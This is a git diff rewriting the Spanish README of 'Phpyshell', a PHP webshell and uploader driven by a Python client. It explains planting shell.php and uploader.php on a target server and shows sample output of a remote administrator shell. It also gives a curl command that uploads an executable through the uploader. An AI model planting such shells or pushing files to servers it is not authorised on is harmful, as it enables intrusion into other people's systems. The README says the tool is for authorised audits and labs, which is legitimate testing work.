@@ -1,68 +1,165 @@
-# Phpyshell
+# ⚡ Phpyshell
 
-![License](https://img.shields.io/badge/license-MIT-green)
-![PHP](https://img.shields.io/badge/PHP-7.4%2B-blue)
-![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-lightgrey)
+<div align="center">
 
-**Phpyshell** es una WebShell ligera, interactiva y potente diseñada para entornos de auditoría y administración remota.
+![License](https://img.shields.io/badge/License-MIT-success?style=for-the-badge)
+![PHP](https://img.shields.io/badge/PHP-7.4+-777BB4?style=for-the-badge\&logo=php)
+![Platform](https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=for-the-badge\&logo=kalilinux)
+![Python](https://img.shields.io/badge/Python-3.x-blue?style=for-the-badge\&logo=python)
+
+**WebShell ligera, interactiva y potente para auditorías de seguridad y administración remota.**
+
+</div>
 
 ---
 
-## Instalación
+## ✨ Características
 
-1. **Clonar el repositorio:**
-   ```bash
-      git clone https://github.com/kr1pt0n/phpyshell.git
-      cd phpyshell
+* ⚡ Comunicación interactiva en tiempo real.
+* 📤 Subida de archivos integrada.
+* 📥 Descarga de archivos.
+* 🔍 Detección automática de WebShells y Uploaders.
+* 💻 Consola remota con comandos del sistema.
+* 🪶 Código ligero y fácil de desplegar.
 
-2. **Alojar archivos .php en servidor objetivo:**
-   ```bash
-      http://192.168.20.10:8000/path/uploader.php
-      http://192.168.20.10:8000/path/shell.php
-   
-3. **Comunicar con webshell:**
-   Editar **server.py** y agregar endpoints en la seccion
+---
+
+# 📂 Estructura
+
+```text
+phpyshell/
+│
+├── shell.php          # WebShell
+├── uploader.php       # Uploader
+├── server.py          # Cliente de comunicación
+└── README.md
+```
+
+---
+
+# 🚀 Instalación
+
+## 1️⃣ Clonar el repositorio
+
 ```bash
-   ENDPOINTS = [
-      "http://192.168.20.10:8000/path/uploader.php",
-      "http://192.168.20.10:8000/path/shell.php"
-       ]
-   ```
-4. **Iniciar Servidor y comunicación:**
-   ```bash
-     python3 server.py
-   ```
-5. **Respuesta**
-   ```bash
-     server@zentryx:~/Escritorio$ python3 no.py
+git clone https://github.com/kr1pt0n/phpyshell.git
+cd phpyshell
+```
 
+---
+
+## 2️⃣ Subir los archivos PHP al servidor
+
+Ejemplo:
+
+```text
+http://192.168.20.10:8000/path/shell.php
+
+http://192.168.20.10:8000/path/uploader.php
+```
+
+---
+
+## 3️⃣ Configurar los endpoints
+
+Editar `server.py`
+
+```python
+ENDPOINTS = [
+    "http://192.168.20.10:8000/path/shell.php",
+    "http://192.168.20.10:8000/path/uploader.php"
+]
+```
+
+---
+
+## 4️⃣ Ejecutar
+
+```bash
+python3 server.py
+```
+
+---
+
+# 🖥️ Ejemplo de ejecución
+
+```text
 ============================================================
-                  WEBSHELL INTERACTIVA 
+                  WEBSHELL INTERACTIVA
 ============================================================
+
 [*] Iniciando análisis dinámico de comportamiento PHP...
 
+[+] Webshell Confirmado:
+    http://192.168.20.10:8000/path/shell.php
 
-[+] Webshell Confirmado: http://192.168.20.10:8000/path/shell.php
-[+] Uploader Confirmado: http://192.168.20.10:8000/path/uploader.php
+[+] Uploader Confirmado:
+    http://192.168.20.10:8000/path/uploader.php
 
 ============================================================
                RESUMEN DE DISPONIBILIDAD
 ============================================================
+
  Webshells operativas (GET/system):  1
  Uploaders operativos (POST/move):   1
+
 ============================================================
 
-[*] Canal interactivo establecido en: http://192.168.20.10:8000/path/shell.php
-[+] Conectado con éxito como: servidor\administrator
-[*] Comandos especiales locales:
-    -> upload <archivo_local> <nombre_remoto>
-    -> download <archivo_remoto> <nombre_local>
-    -> exit / clear
-    >> Uso de los uploaders
+[*] Canal interactivo establecido en:
+    http://192.168.20.10:8000/path/shell.php
 
-    -> curl -F "file=@/ruta/de/tu/archivo/local" http://192.168.20.10:8000/path/uploader.php
-    
+[+] Conectado con éxito como:
+    servidor\administrator
 
-(servidor\administrator) C:\path> 
+(servidor\administrator) C:\path>
+```
 
-   ```
+---
+
+# 📤 Subir archivos
+
+Desde la consola:
+
+```text
+upload <archivo_local> <nombre_remoto>
+```
+
+o utilizando `curl`
+
+```bash
+curl -F "file=@archivo.exe" \
+http://192.168.20.10:8000/path/uploader.php
+```
+
+---
+
+# 📥 Descargar archivos
+
+```text
+download <archivo_remoto> <nombre_local>
+```
+
+---
+
+# ⌨️ Comandos disponibles
+
+| Comando    | Descripción        |
+| ---------- | ------------------ |
+| `upload`   | Subir archivos     |
+| `download` | Descargar archivos |
+| `clear`    | Limpiar pantalla   |
+| `exit`     | Salir              |
+
+---
+
+# ⚠️ Aviso
+
+Este proyecto está destinado **únicamente para auditorías autorizadas, investigación y entornos de laboratorio**.
+
+El uso no autorizado contra sistemas de terceros puede ser ilegal.
+
+---
+
+# 📄 Licencia
+
+MIT License.
